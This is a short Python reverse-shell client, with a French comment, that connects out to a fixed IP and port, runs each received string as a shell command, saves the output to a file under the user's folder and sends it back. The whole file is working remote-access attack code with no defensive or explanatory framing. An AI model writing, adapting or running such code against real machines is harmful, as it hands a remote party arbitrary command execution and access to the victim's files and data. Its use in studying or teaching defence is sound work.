import socket
import os
import sys
import subprocess

host_name = socket.gethostname()
ip = socket.gethostbyname(host_name)
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect(("192.168.0.149", 1268)) # non-local => changer socket._LOCALHOST en votre ip

print("connected")

while True:
    data = server.recv(1024).decode("utf-8")

    if len(data) > 0:
        try:
            with open(f"C:/users/{host_name}/data.txt", "w+") as f:
                proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                out, err = proc.communicate()
                f.write(out.decode("utf-8"))
                print("client : ",out)
                server.send(out)
        except Exception as e:
            print("error", e)
            server.send(f"Error : {ip} => {e}".encode())




